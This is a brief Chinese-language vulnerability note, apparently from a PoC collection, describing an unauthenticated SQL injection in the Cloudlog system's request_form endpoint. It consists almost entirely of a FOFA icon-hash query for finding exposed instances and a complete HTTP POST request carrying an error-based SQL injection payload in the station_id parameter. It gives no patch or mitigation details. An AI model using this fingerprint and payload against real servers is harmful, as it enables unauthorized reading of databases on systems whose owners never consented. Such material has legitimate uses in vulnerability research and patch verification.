# Cloudlog系统request_form存在SQL注入漏洞

Cloudlog系统接口request_form未授权SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息。

## fofa

```javascript
icon_hash="-460032467"
```

## poc

```javascript
POST /index.php/oqrs/request_form HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close

station_id=1 AND (SELECT 2469 FROM(SELECT COUNT(*),CONCAT(0x7162716b71,(SELECT (ELT(2469=2469,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```

![image-20241219150127938](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412191501995.png)